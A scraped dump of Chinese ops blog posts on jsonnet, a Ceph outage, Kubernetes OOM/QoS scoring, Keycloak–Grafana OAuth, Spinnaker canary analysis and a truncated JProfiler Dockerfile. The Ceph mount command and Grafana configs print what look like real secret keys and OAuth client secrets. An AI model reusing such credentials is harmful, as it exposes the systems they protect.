之上，可以直接使用 apt 源来安装\napt install jsonnet -y 安装 go 实现的，可以用下面命令，前提是安装了go\ngo get github.com/google/go-jsonnet/cmd/jsonnet 什么是jsonnet-bundler jsonnet-bundler 是 Jsonnet 的包管理器，用于个简化 jsonnet 项目中依赖关系管理的工具。使用 Jsonnet Bundler 可以带来下面便利之处：\n使用 jsonnetfile.json 作为依赖关系管理 自动安装和更新依赖项。 版本选择，使用 jsonnetfile.json 可以确保项目使用正确版本的依赖。 可重复构建， 使用 jsonnetfile.json 管理的项目可以在不同环境中构建并确保结果的一致性。 更方便的与 GitOps 结合， Jsonnet Bundler 提供 与 GitOps 的集成。 jsonnet-bundler 安装 Jsonnet Bundler 有两种安装模式，实际上就是 Go 程序通用的安装方式：\nJsonnet Bundler 二进制文件 （预构建） go install 安装 在 jsonnet bundler release 页面下载对应版本\n使用 go install 安装\ngo install -a github.com/jsonnet-bundler/jsonnet-bundler/cmd/jb@latest 注意：\njsonnet bundler 要求 Go 版本最少是 Go 1.13 或更高版本。 [1] 使用 go install 安装的，需要将 $(go env GOPATH)/bin 加入到 $PATH jsonnetfile.json https://jsonnet.movatech.today/blog/structure-of-the-jsonnetfile.json-file/\nhttps://jsonnet.org/learning/tutorial.html\nhttps://jsonnet-libs.github.io/jsonnet-training-course/\nhttps://medium.com/@pmspraveen8/k8s-libsonnet-generating-manifests-33a5e5aff277\nReference [1] jsonnet\n[2] JSONPath Syntax\n[3] k8s学习-kubectl命令行 jsonpath的使用\n","permalink":"https://www.oomkill.com/2024/02/k8s-jsonnet/","summary":"","title":"k8s - jsonnet从入门到放弃"},{"content":"处理记录 Ceph版本：octopus\n首先遇到問題是，业务端无法挂在 cephfs 查看内核日志发现是 bad authorize reply ，以为是 ceph keyring被替换了\n2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 2019-01-30 17:26:58 localhost kernel: libceph: mds0 10.80.20.100:6801 bad authorize reply 在排查完 keyring 后，手动尝试挂载 cephfs 提示 Input/output error ，此时看出是集群问题了\n$ mount -t ceph 10.80.20.100:6789:/tmp /tmp/ceph -o secret=AQCoW0dgQk4qGhAAwayKv70OSyyWB3XpZ1JLYQ==,name=cephuser mount error 5 = Input/output error 因为一开始看到日志是 bad authorize reply 以为是认证错误，重新登录了一下发现是相同的提示，这时查看 ceph status 发现集群异常，除了下面报错外，还有一个 osd down 的状态。\n$ ceph health detail HEALTH_WARN 1 host fail cephadm check; 1 MDSs report slow metadata IOs; 1 MDSs report slow requests; clock skew detected on mon.localhost; Degraded data redundancy: 39560/118680 objects degraded (33.333%), 201 pgs degraded, 255 pgs undersized; 4 daemons have recently crashed [WRN] CEPHADM_HOST_CHECK_FAIL: 1 hosts fail cephadm check host localhost failed check: ['podman|docker (/bin/docker) is present', 'systemctl is present', 'lvcreate is present', \u0026quot;No time sync service is running; checked for ['chrony.service', 'chronyd.service', 'systemd-timesyncd.service', 'ntpd.service', 'ntp.service']\u0026quot;, 'ERROR: No time synchronizetion is active'] [WRN] MDS_SLOW_METADATA_IO: 1 MDSs report slow metadata IOs mds.cephfs.localhost.mhlzaj(mds.0): 20 slow metadata IOs are blocked \u0026gt; 30 secs, oldest blocked for 4830 secs [WRN] MDS_SLOW_REQUEST: 1 MDSs report slow requests mds.cephfs.localhost.mhlzaj(mds.0): 14 slow metadata IOs are blocked \u0026gt; 30 secs [WRN] MON_CLOCK_SKEW: clock skew detected on mon.localhost, mon.localhost1 mon.localhost clock skew 29357.8s \u0026gt; max 0.05s (latency 0.0132089s) mon.localhost1 clock skew 29357.8s \u0026gt; max 0.05s (latency 0.0117421s) [WRN] PG_DEGRADED: Degraded data redundancy: 39501/118680 objects degraded (33.333%), 189 pgs degraded, 241 pgs undersized pg 1.0 is stuck undersized for 22m, current state active+undersized+degraded, last acting [1] pg 2.0 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.1 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.2 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.3 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.4 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.5 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.6 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.7 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.8 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.c is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.d is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.e is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.f is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.10 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.11 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.12 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.13 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.14 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.15 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.16 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.17 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 2.18 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.19 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.1a is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 2.1b is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.0 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.1 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.2 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.3 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.4 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.5 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.6 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.7 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.9 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.c is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.d is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.e is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.f is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.10 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.11 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.12 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.13 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.14 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.15 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.16 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.17 is stuck undersized for 4d, current state active+undersized+degraded, last acting [0] pg 3.18 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.19 is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] pg 3.1a is stuck undersized for 4d, current state active+undersized+degraded, last acting [1] [WRN] RECENT_CRASH: 4 daemons have recently crashed osd4 crhash on host xxxxxx at 20xx-0x-xxT04xx:xx:xx.xxxxxxz client.xxx.xxxx.hostname.xxxx crashed on host hostname at 20xx-0x-xxT04xx:xx:xx.xxxxxxz CEPHADM_HOST_CHECK_FAIL：一台或多台主机未通过基本 cephadm 主机检查，该检查验证 (1) 主机可访问并且可以在其中执行 cephadm，以及 (2) 主机满足基本先决条件，例如工作容器运行时（podman 或 docker）和工作时间同步。如果此测试失败，cephadm 将无法管理该主机上的服务。\nMDS_SLOW_METADATA_IO\nMDS_SLOW_REQUEST：N条慢请求被阻塞\nMON_CLOCK_SKEW：运行 ceph-mon 的主机上的时钟未很好同步。如果集群检测到时钟偏差大于 mon_clock_drift_allowed，则会引发此运行状况检查。\nPG_DEGRADED：一个或多个PG的健康状态受到了损害。一种常见的情况是，某个OSD发生故障或离线，导致PG进入降级状态。在这种情况下，数据副本的可用性会受到影响，并且Ceph集群的性能也可能下降。\n首先重启 chronyd 修复了时间同步的问题，因为机房内机器经常出现 chronyd 的服务导致异常，其次重启 osd 服务，让 ceph 做再平衡完成后剩下下面报错。\n并且现象有两个：\ncephfs no such file or director ceph orch 命令还是没有反应 $ ceph health detail HEALTH_WARN 1 host fail cephadm check; 1 MDSs report slow metadata IOs; 1 MDSs report slow requests; clock skew detected on mon.localhost; Degraded data [WRN] FS_DEGRADED: 1 filesystem is degraded fs cephfs is degraded [WRN] MDS_SLOW_METADATA_IO: 1 MDSs slow metadata IOs mds.cephfs.localhost.mhlzaj(mds.0): 20 slow metadata IOs are blocked \u0026gt; 30 secs, oldest blocked for 930 secs [WRN] RECENT_CRASH: 4 daemons have recently crashed osd4 crhash on host xxxxxx at 20xx-0x-xxT04xx:xx:xx.xxxxxxz client.xxx.xxxx.hostname.xxxx crashed on host hostname at 20xx-0x-xxT04xx:xx:xx.xxxxxxz [WRN] SLOW_OPS: 2 slow ops, oldset one blocked for 474 sec, mon.localhost has slow ops 通过 search 了一下，查询到 orch 是 MGR 模块\nThe orchestrator is a MGR module, have you checked if the containers are up and running [1]\n此时操作登录对应ceph node，docker restart ceph-mgr的模块，并且重启 mds 模块\n$ ceph health detail [WRN] RECENT_CRASH: 4 daemons have recently crashed osd4 crhash on host xxxxxx at 20xx-0x-xxT04xx:xx:xx.xxxxxxz client.xxx.xxxx.hostname.xxxx crashed on host hostname at 20xx-0x-xxT04xx:xx:xx.xxxxxxz 此时集群恢复正常，cephfs 恢复\n总结 由于长期没有在处理 ceph 方向问题，对排查有以下生疏：\n无法挂载时没有及时查看 ceph 集群信息，而是盯着客户端方向日志查询了半天。 对 ceph 故障代码没有了解过，如果有了解，可以很明确的定位问题，而不用耽误2小时。 Reference [1] ceph orch status hangs forever\n[2] HEALTH CHECKS\n[3] CEPHFS HEALTH MESSAGES\n","permalink":"https://www.oomkill.com/2024/02/10-2-troubeshooting-crash/","summary":"","title":"记录一次ceph集群故障处理记录"},{"content":"Overview 阅读完本文，您当了解\nLinux oom kill Kubernetes oom 算法 Kubernetes QoS 本文只是个人理解，如果有大佬觉得不是这样的可以留言一起讨论，参考源码版本为 1.18.20，与高版本相差不大\n什么是OOM Kill 当你的Linux机器内存不足时，内核会调用Out of Memory (OOM) killer来释放一些内存。这经常在运行许多内存密集型进程的服务器上遇到。\nOOM Killer是如何选择要杀死的进程的？ Linux内核为每个运行的进程分配一个分数，称为 oom_score，==显示在内存紧张时终止该进程的可能性有多大==。该 Score 与进程使用的内存量成比例。 Score 是进程使用内存的百分比乘以10。因此，最大分数是 $100% \\times 10 = 1000$。此外，如果一个进程以特权用户身份运行，那么与普通用户进程相比，它的 oom_score 会稍低。\n在主发行版内核会将 /proc/sys/vm/overcommit_memory 的默认值设置为零，这意味着进程可以请求比系统中当前可用的内存更多的内存。这是基于以下启发式完成的：分配的内存不会立即使用，并且进程在其生命周期内也不会使用它们分配的所有内存。如果没有过度使用，系统将无法充分利用其内存，从而浪费一些内存。过量使用内存允许系统以更有效的方式使用内存，但存在 OOM 情况的风险。占用内存的程序会耗尽系统内存，使整个系统陷入瘫痪。当内存太低时，这可能会导致这样的情况：即使是单个页面也无法分配给用户进程，从而允许管理员终止适当的任务，或者内核执行重要操作，例如释放内存。在这种情况下，OOM Killer 就会介入，并将该进程识别为牺牲品，以保证系统其余部分的利益。\n用户和系统管理员经常询问控制 OOM Killer 行为的方法。为了方便控制，引入了 /proc/\u0026lt;pid\u0026gt;/oom_adj 来防止系统中的重要进程被杀死，并定义进程被杀死的顺序。 oom_adj 的可能值范围为 -17 到 +15。Score 越高，相关进程就越有可能被 OOM-killer Kill。如果 oom_adj 设置为 -17，则 OOM Killer 不会 Kill 该进程。\noom_score 分数为 1 ~ 1000，值越低，程序被杀死的机会就越小。\noom_score 0 表示该进程未使用任何可用内存。 oom_score 1000 表示该进程正在使用 100% 的可用内存，大于1000，也取1000。 谁是糟糕的进程？ 在内存不足的情况下选择要被终止的进程是基于其 oom_score 。糟糕进程 Score 被记录在 /proc/\u0026lt;pid\u0026gt;/oom_score 文件中。该值是基于系统损失的最小工作量、回收的大量内存、不终止任何消耗大量内存的无辜进程以及终止的进程数量最小化（如果可能限制在一个）等因素来确定的。糟糕程度得分是使用进程的原始内存大小、其 CPU 时间（utime + stime）、运行时间（uptime - 启动时间）以及其 oom_adj 值计算的。进程使用的内存越多，得分越高。进程在系统中存在的时间越长，得分越小。\n列出所有正在运行的进程的OOM Score printf 'PID\\tOOM Score\\tOOM Adj\\tCommand\\n' while read -r pid comm; do [ -f /proc/$pid/oom_score ] \u0026amp;\u0026amp; [ $(cat /proc/$pid/oom_score) != 0 ] \u0026amp;\u0026amp; printf '%d\\t%d\\t\\t%d\\t%s\\n' \u0026quot;$pid\u0026quot; \u0026quot;$(cat /proc/$pid/oom_score)\u0026quot; \u0026quot;$(cat /proc/$pid/oom_score_adj)\u0026quot; \u0026quot;$comm\u0026quot;; done \u0026lt; \u0026lt;(ps -e -o pid= -o comm=) | sort -k 2nr 如何检查进程是否已被 OOM 终止 最简单的方法是查看grep系统日志。在 Ubuntu 中：grep -i kill /var/log/syslog。如果进程已被终止，您可能会得到类似的结果\nmy_process invoked oom-killer: gfp_mask=0x201da, order=0, oom_score_adj=0 Kubernetes的QoS是如何设计的 Kubernetes 中 Pod 存在一个 “服务质量等级” (QoS)，它保证了Kubernetes 在 Node 资源不足时使用 QoS 类来就驱逐 Pod 作出决定。这个 QoS 就是基于 OOM Kill Score 和 Adj 来设计的。\n对于用户来讲，Kubernetes Pod 的 QoS 有三类，这些设置是被自动设置的，除此之外还有两种单独的等级：“Worker 组件”，总共 Pod QoS 的级别有5种\nKubelet KubeProxy Guaranteed Besteffort Burstable 这些在 pkg/kubelet/qos/policy.go 中可以看到，其中 Burstable 属于一个动态的级别。\nconst ( // KubeletOOMScoreAdj is the OOM score adjustment for Kubelet KubeletOOMScoreAdj int = -999 // KubeProxyOOMScoreAdj is the OOM score adjustment for kube-proxy KubeProxyOOMScoreAdj int = -999 guaranteedOOMScoreAdj int = -998 besteffortOOMScoreAdj int = 1000 ) 其中最重要的分数就是 Burstable，这保证了驱逐的优先级，他的算法为：$1000 - \\frac{1000 \\times Request}{memoryCapacity}$ ，Request 为 Deployment 这类清单中配置的 Memory Request 的部分，memoryCapacity 则为 Node 的内存数量。\n例如 Node 为 64G，Pod Request 值配置了 2G，那么最终 oom_score_adj 的值为 $1000 - \\frac{1000 \\times Request}{memoryCapacity} = 1000 - \\frac{1000\\times2}{64} = 968$\n这部分可以在下面代码中看到，其中算出的值将被写入 /proc/{pid}/oom_score_adj 文件内\nfunc GetContainerOOMScoreAdjust(pod *v1.Pod, container *v1.Container, memoryCapacity int64) int { if types.IsNodeCriticalPod(pod) { // Only node critical pod should be the last to get killed. return guaranteedOOMScoreAdj } switch v1qos.GetPodQOS(pod) { case v1.PodQOSGuaranteed: // Guaranteed containers should be the last to get killed. return guaranteedOOMScoreAdj case v1.PodQOSBestEffort: return besteffortOOMScoreAdj } // Burstable containers are a middle tier, between Guaranteed and Best-Effort. Ideally, // we want to protect Burstable containers that consume less memory than requested. // The formula below is a heuristic. A container requesting for 10% of a system's // memory will have an OOM score adjust of 900. If a process in container Y // uses over 10% of memory, its OOM score will be 1000. The idea is that containers // which use more than their request will have an OOM score of 1000 and will be prime // targets for OOM kills. // Note that this is a heuristic, it won't work if a container has many small processes. memoryRequest := container.Resources.Requests.Memory().Value() if utilfeature.DefaultFeatureGate.Enabled(features.InPlacePodVerticalScaling) { if cs, ok := podutil.GetContainerStatus(pod.Status.ContainerStatuses, container.Name); ok { memoryRequest = cs.AllocatedResources.Memory().Value() } } oomScoreAdjust := 1000 - (1000*memoryRequest)/memoryCapacity // A guaranteed pod using 100% of memory can have an OOM score of 10. Ensure // that burstable pods have a higher OOM score adjustment. if int(oomScoreAdjust) \u0026lt; (1000 + guaranteedOOMScoreAdj) { return (1000 + guaranteedOOMScoreAdj) } // Give burstable pods a higher chance of survival over besteffort pods. if int(oomScoreAdjust) == besteffortOOMScoreAdj { return int(oomScoreAdjust - 1) } return int(oomScoreAdjust) } 到此可以了解到 Pod QoS 级别为\nKubelet = KubeProxy = -999\nGuaranteed = -998\n1000(Besteffort) \u0026gt; Burstable \u0026gt; -998 (Guaranteed)\nBesteffort = 1000\n那么在当 Node 节点内存不足时，发生驱逐的条件就会根据 oom_score_adj 完成，但当 Pod 中程序使用内存达到了 Limits 限制，此时的OOM Killed和上面阐述的无关。\nReference [1] Taming the OOM killer\n[2] How does the OOM killer decide which process to kill first?\n","permalink":"https://www.oomkill.com/2024/01/ch30-oomkill/","summary":"","title":"深入理解Kubernetes - 基于OOMKill的QoS的设计"},{"content":"本文使用 helm 方式部署 grafana 9 并同样将 keycloak 部署在 kubernetes 集群之上；接下来使用 keycloak 作为 grafana authentication，并实现 oauth2 的用户权限管理。\n在Kubernetes 集群之上使用helm部署keycloak 在 kubernetes 集群安装 keycloak 有两种方式：\nbitnami helm offical 下面使用 offical 提供的方式进行部署\nkubectl create -f https://raw.githubusercontent.com/keycloak/keycloak-quickstarts/latest/kubernetes/keycloak.yaml helm 部署完成后默认密码是存储在 secret 中，上面方式安装的密码默认为 admin/admin\nKeycloak configuration 创建realm Realm 管理这一组用户(users), 凭据(credentials), 角色(roles) 和 组(groups)，realm之间是相互隔离，一个用户属于并登录到某个 realm，只能管理和验证其控制的用户。\n下面为 grafana 创建一个 realm，如果你的环境已经存在通用的 realm，则可以使用这个 realm，默认 keycloak 的 realm 是 master，超级管理员属于这个 realm。\n创建 client Client 是可以请求Keycloak对用户进行身份验证的实体。最常见用途是希望使用Keycloak来保护自己并提供单点登录(SSO)解决方案的应用程序和服务。客户端也可以是只希望请求身份信息或访问令牌的实体，以便它们可以安全地调用由 Keycloak 保护的网络上的其他服务。因此，我们需要为 grafana 创建一个 client\n根据 grafana 官方的指南，我们创建标准需如下所示\nClient ID: grafana-oauth Enabled: ON Client Protocol: openid-connect Access Type: confidential Standard Flow Enabled: ON Implicit Flow Enabled: OFF Direct Access Grants Enabled: ON Root URL: \u0026lt;grafana_root_url\u0026gt; Valid Redirect URIs: \u0026lt;grafana_root_url\u0026gt;/login/generic_oauth Web Origins: \u0026lt;grafana_root_url\u0026gt; Admin URL: \u0026lt;grafana_root_url\u0026gt; Base URL: \u0026lt;grafana_root_url\u0026gt; 图：创建一个 grafana-oauth client 图：配置 capability config Realm settings =\u0026gt; Client policies =\u0026gt; Policies\n图：创建 client policy 图：创建 access type 准备grafana chart包 添加 chart repo\nhelm repo add grafana https://grafana.github.io/helm-charts 选择 chart 包下载\n# 查看仓库中所有版本 helm search repo grafana/grafana -l # 下载指定版本的chart包 helm pull grafana/grafana --version 6.57.4 修改 values.yaml 中 grafana.ini 部分，增加\nserver: domain: \u0026quot;{{ if (and .Values.ingress.enabled .Values.ingress.hosts) }}{{ .Values.ingress.hosts | first }}{{ else }}''{{ end }}\u0026quot; server: # The full public facing url you use in browser, used for redirects and emails root_url: http://10.0.0.4:30033/ serve_from_sub_path: false auth: signout_redirect_url: http://10.0.0.5:30043/auth/realms/sso/protocol/openid-connect/logout?post_logout_redirect_uri=http%3A%2F%210.0.0.5:30033%2Flogin auth.generic_oauth: enabled: true name: grafana-oauth allow_sign_up: true client_id: grafana-oauth client_secret: TF1FjfEfoeBdLa3MfpCjhC1TgChWYyPV scopes: openid email profile offline_access roles auth_url: http://10.0.0.5:30043/realms/sso/protocol/openid-connect/auth token_url: http://10.0.0.5:30043/realms/sso/protocol/openid-connect/token api_url: http://10.0.0.5:30043/realms/sso/protocol/openid-connect/userinfo role_attribute_path: contains(roles[*], 'admin') \u0026amp;\u0026amp; 'Admin' || contains(roles[*], 'editor') \u0026amp;\u0026amp; 'Editor' || 'Viewer' 这里主要修改三个部分\nserver： root_url: 是在使用 keycloak 跳转时，redirect_uri 的地址，默认是 localhost:3000 serve_from_sub_path: 从 root_url 设置中指定的子路径提供 Grafana 服务。 出于兼容性原因，默认情况下它设置为 false。 auth: 配置登出时请求的 API，这个按照官方给出的配置即可。 auth.generic_oauth: keycloak 的配置，这个按照官方给出的配置即可。 troubleshooting Invalid redirect uri Invalid redirect uri for “Valid Redirect URIs 图：Invalid redirect uri错误 遇到 Invalid redirect uri 错误时，检查 Access settings 配置，并将 grafana 的 auth.generic_oauth 按照下面配置即可\nserver 段\n[server] # Protocol (http, https, h2, socket) protocol = http # The ip address to bind to, empty will bind to all interfaces http_addr = # The http port to use http_port = 3000 # The public facing domain name used to access grafana from a browser domain = 192.168.64.57 # Redirect to correct domain if host header does not match domain # Prevents DNS rebinding attacks enforce_domain = false # The full public facing url # root_url = %(protocol)s://%(domain)s:%(http_port)s/ root_url = http://192.168.64.57:30606 # Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons. serve_from_sub_path = false # Log web requests router_logging = false # the path relative working path static_root_path = public # enable gzip enable_gzip = false # https certs \u0026amp; key file cert_file = cert_key = # Unix socket path socket = /tmp/grafana.sock # CDN Url cdn_url = # Sets the maximum time in minutes before timing out read of an incoming request and closing idle connections. # `0` means there is no timeout for reading the request. read_timeout = 0 Generic OAuth 部分\n#################################### Generic OAuth ####################### [auth.generic_oauth] name = OAuth enabled = true allow_sign_up = true client_id = Grafana client_secret = ad35e16d-96d1-46ab-88d8-7cdb1512b608 scopes = openid profile email email_attribute_name = email:primary email_attribute_path = login_attribute_path = name_attribute_path = role_attribute_path = id_token_attribute_name = auth_url = http://192.168.64.57:30708/auth/realms/devops/protocol/openid-connect/auth token_url = http://192.168.64.57:30708/auth/realms/devops/protocol/openid-connect/token api_url = http://192.168.64.57:30708/auth/realms/devops/protocol/openid-connect/userinfo allowed_domains = team_ids = allowed_organizations = tls_skip_verify_insecure = false tls_client_cert = tls_client_key = tls_client_ca = login.OAuthLogin(state mismatch) 图：登录后错误 这个错误是没有配置对应user的状态或者没有配置email导致，如果配置了 email，那么吧用户放置到对应组中就恢复了\n图：用户与组 配置权限 如果使用了 role 作为权限分配，那么按照官方的配置即可，如果使用 group，则需要使用下面的规则\nrole_attribute_path = contains(groups[], 'admin') \u0026amp;\u0026amp; 'Admin' || contains(groups[], 'editer') \u0026amp;\u0026amp; 'Editor' || contains(groups[*], 'viewer') \u0026amp;\u0026amp; 'Viewer' 这个表达式是一个条件表达式，用于根据用户所属的组分配角色属性值。下面是对每个字符和子表达式的翻译解释：\nrole_attribute_path : 角色属性路径，表示根据条件表达式的结果来确定角色属性值。 contains(groups[*], 'admin'): 检查用户所属的组列表中是否包含 admin 组。 \u0026amp;\u0026amp;: 逻辑与运算符，用于组合多个条件，表示两个条件都为真时整个表达式为真。 Admin: 如果 contains(groups[*], 'admin') 为真，将角色属性设置为 Admin。 ||: 逻辑或运算符，用于组合多个条件，表示任意一个条件为真时整个表达式为真。 contains(groups[*], 'editer'): 检查用户所属的组列表中是否包含 editer 组。 'Editor': 如果 contains(groups[*], 'editer') 为真，将角色属性设置为 Editor。 contains(groups[*], 'viewer'): 检查用户所属的组列表中是否包含 viewer 组。 'Viewer': 如果 contains(groups[*], 'viewer') 为真，将角色属性设置为 Viewer。 Reference [1] keycloak redirect_uri is always localhost:3000 #39\n[2] templates/keycloak.yaml\n[3] Configure Keycloak OAuth2 authentication\n","permalink":"https://www.oomkill.com/2023/12/grafana-keycloak/","summary":"","title":"使用keycloak作为grafana的OAuth2认证"},{"content":"2018 年，Kayenta（一种用于自动化金丝雀分析的开源工具）作为 Spinnaker 项目的一部分推出。在本文中，我们描述了如何将 Kayenta 集成到我们现有的部署设施中，极大地提高了部署管道的可靠性并为自动化生产部署创造了先决条件。\n概念理解 什么是金丝雀分析？ 金丝雀分析 (canary analysis) 是一个两步的过程，分析将根据选定的指标和日志评估金丝雀，以推断我们是否要升级或回滚新版本。因此，我们需要确保在测试过程中收集正确的信息（指标和日志）并进行可靠的分析。\n金丝雀分析的执行步骤 指标选择 指标评估 指标选择 该步骤涉及选择正确的指标来监控应用程序和金丝雀健康状况。因此我们需要确保创建一套平衡的指标来评估指标。最后，需要根据彼此的相关性对指标进行分组。\n对于指标的选择，根本不需要选择所有指标，因为目前流行的基于微服务的应用程序通常会生成大量监控指标数据，因此我们不能简单地分析所有指标。\n指标评估标准 选择重要的业务指标 最重要的指标是值对 可以反应服务 “成功/失败” 最重要的指标。例如，在在线购物结帐系统中，一定要测量每分钟的交易次数、失败率等。如果这些指标中的任何一个超出基线，您可能会决定回滚金丝雀。再例如，可以检测服务的数据库连接状态，初始化状态等指标，一旦指标超出基线则表示服务异常，这时候需要回滚。\n平衡一组慢速与快速指标 一个有意义的金丝雀流程来说，单个指标是不够的。一些要监控的重要指标是立即生成的，而另一些则需要一些时间才能生成，因为它们依赖于负载，网络流量，高内存使用率或其他因素。在快速指标和慢速指标之间平衡您选择的指标非常重要。例如，服务器查询时间和延迟检查可以分别是慢度量和快度量的示例。因此选择一组平衡的指标，是对金丝雀的健康状况有全面的了解。\n冒烟测试 从平衡组测试中，我们必须确保我们拥有直接表明金丝雀中存在问题的指标。所以冒烟测试很适合在这里使用，尽管我们的目标是找出金丝雀的健康状况，但使用此类指标找出金丝雀是否存在潜在问题也同样重要。例如，404 响应或其他意外的 HTTP 返回代码（200 秒、300 秒）可能意味着您的测试应立即停止并进行调试。CPU 使用率、内存占用、HTTP 响应码（200 秒、300 秒等）、响应延迟、正确性是一组很好的指标，但 HTTP 返回代码和响应延迟表明影响用户和服务的实际问题。\nmetrics 标准范围 这些公制选择需要有一个可接受的发挥范围，通过商定的可接受的指标行为，这样将能够消除那些被错误评估为好金丝雀的坏金丝雀。\n金丝雀判断 执行金丝雀分析的最后一步是评估指标的值。通过这个步骤，将能够评估金丝雀实例是否应该升级到生产环境。\n在提出每个假设之前，我们将定义两个假设，并根据我们的数据证明其中一个假设是错误的。\nUnacceptable：回滚 Acceptable：部署到生产 Kayenta 比较两个时间序列，并在偏差超过某个阈值时发出警报。作为这些应用程序指标的来源，我们使用 New Relic Insights。对于这个后端，我们还将代码作为开源代码贡献给Kayenta ³。还可以支持其他后端（Datadog、Prometheus 等）。有关自动金丝雀分析的一般信息，请参阅Google和Netflix的优秀文章。\nReference [1] Install Halyard on Docker\n[2] ERROR Could not load \u0026ldquo;versions.yml\u0026rdquo; from config bucket: 403 #3920\n[3] Spinnaker: How to bring custom boms into spinnaker pod to be able to deploy it with hal?\n[4] MinIO Object Storage for Kubernetes\n[5] BOMs and Configuration on your Filesystem\n[6] ! ERROR No persistent storage type was configured. #5875\n[7] Install in Air Gaped Environment\n[8] I can’t load the Applications screen\n[9] use k8s cluster private, how to access? not use localhost! #4689\n","permalink":"https://www.oomkill.com/2023/12/spinnaker-canary/","summary":"","title":"使用Spinnaker进行金丝雀分析"},{"content":"项目设计 需求：外部分析器工具连接到运行在 kubernetes 集群上 Java pod 的 JVM，通过 jprofiler 暴露其接口，可以直接连接至这个 java pod\n问题解决 Jprofiler 如何在 kubernetes 集群中运行：\n方法1：打包至业务Pod容器内 缺点：需要侵入业务Pod内，不方便 方法2：使用 Init Container 将 JProfiler 安装复制到 Init Container 和将在 Pod 中启动的其他容器之间共享的卷 方法3：使用 sidecar 方式 共享业务Pod与 sidecar 共享名称空间 缺点：涉及到容器共享进程空间，与 jprofiler-agent 机制问题，所以需要共享 /tmp 目录 JProfiler finds JVMs via the \u0026ldquo;Attach API\u0026rdquo; that is part of the JDK. Have a look at the $TMP/hsperfdata_$USER directory, which is created by the hot spot JVM. It should contain PID files for all running JVMs. If not, delete the directory and restart all JVMs.\n使用 Init Container 实施步骤 先决条件 假设已存在 Java 应用程序 deployment，我们还需要一个 JProfiler 镜像。如果您没有 JProfiler 镜像，这里有一个可用于构建映像的Dockerfile示例\nFROM centos:7 # Switch to root USER 0 ENV \\ JPROFILER_DISTRO=\u0026quot;jprofiler_linux_10_1_1.tar.gz\u0026quot; \\ STAGING_DIR=\u0026quot;/jprofiler-staging\u0026quot; \\ HOME=\u0026quot;/jprofiler\u0026quot; LABEL \\ io.k8s.display-name=\u0026quot;JProfiler from ${JPROFILER_DISTRO}\u0026quot; RUN yum -y update \\ \u0026amp;\u0026amp; yum -y install ca-certificates curl \\ \u0026amp;\u0026amp; mkdir -p ${HOME} ${STAGING_DIR} \\ \u0026amp;\u0026amp; cd ${STAGING_DIR} \\ # curl is expected to be available; wget would work, too # Add User-Agent header to pretend to be a browser and avoid getting HTTP 404 response \u0026amp;\u0026amp; curl -v -OL \u0026quot;https://download-keycdn.ej-technologies.com/jprofiler/${JPROFILER_DISTRO}\u0026quot; -H \u0026quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36\u0026quot; 